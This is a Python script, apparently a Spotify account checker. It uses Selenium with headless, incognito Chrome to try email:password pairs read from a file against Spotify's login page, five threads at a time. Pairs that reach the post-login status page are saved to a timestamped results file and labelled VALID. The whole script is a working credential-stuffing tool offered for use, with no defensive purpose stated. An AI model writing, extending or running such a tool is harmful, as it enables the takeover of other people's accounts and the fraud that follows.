import threading, time, datetime, os

from selenium import webdriver
from selenium.webdriver.common.by import By

from colorama import Fore, Back
import colorama

# <==== Configs ====>

MAX_THREADS = 5
CURRENT_THREADS = 0

USERS_SOURCE_PATH = 'accounts.txt'

RESULTS_FILE_NAME = f'results/results-{datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.txt'

colorama.init(autoreset=True)

options = webdriver.ChromeOptions()

#options for how to open the google chrome driver
options.add_argument("--headless")
options.add_argument("--disable-gpu")
options.add_argument("--incognito")
options.add_argument('--disable-extensions')
options.add_experimental_option('excludeSwitches', ['enable-logging'])

url = 'https://accounts.spotify.com/pt-BR/login'


if not os.path.exists('results'):
    os.mkdir('results')

with open(USERS_SOURCE_PATH, 'r') as file:
    accounts = file.read().split('\n')
    for i in accounts:
        if i == "":
            accounts.remove(i)


def check_account(account):
    # c# <Summary> equivalent (how to create python docs)
    """Checks an account
        Parameters
        ----------
        account : str
            The line containing username and password separated by ':'
        """
    global CURRENT_THREADS
    
    #adds up 1 to the thread counter
    CURRENT_THREADS += 1
    
    driver = webdriver.Chrome(options=options)
    
    #navitages to url
    driver.get(url)
    driver.implicitly_wait(30)

    #extracts credentials from account, which is a complete line of the source file
    email, password = account.split(':')

    # injects the credentials in the html elements
    driver.find_element(By.CSS_SELECTOR, '#login-username').send_keys(email)
    driver.find_element(By.CSS_SELECTOR, '#login-password').send_keys(password)
    driver.find_element(By.CSS_SELECTOR, '#login-button').click()
    # clicks the login button

    time.sleep(1.7)

    #if your are in the landing page after login ->
    if driver.current_url.__contains__("https://accounts.spotify.com") and driver.current_url.__contains__("/status"):
        print(f"{Fore.BLACK}{Back.GREEN}[VALID]{Back.RESET}{Fore.RESET} {email}:{password}")

        with open(RESULTS_FILE_NAME, 'a') as file:
            file.write(f"{email}:{password}\n")
        
        CURRENT_THREADS -= 1
        
        driver.close()
        return
    
    # if you are not ->
    print(f"{Fore.BLACK}{Back.RED}[INVALID]{Back.RESET}{Fore.RESET} {email}:{password}")

    time.sleep(0.5)
    CURRENT_THREADS -= 1
    driver.close()


print(f"Running {MAX_THREADS} threads...\n")

for acc in accounts:
    while True:
        #if using 5 threads, exit while and...
        if CURRENT_THREADS == 5:
            time.sleep(0.5)
            continue
        break
        
    #...creates another Thread that runs the method check_accoutn() with its respective args
    threading.Thread(target=check_account, args=(acc,)).start()
    time.sleep(0.5)

while True:
    if CURRENT_THREADS == 0:
        #saves valid accounts in the file
        print(f'\nYour accounts were saved in "{RESULTS_FILE_NAME}"\n')
        break
    time.sleep(1)

input("Press enter to exit")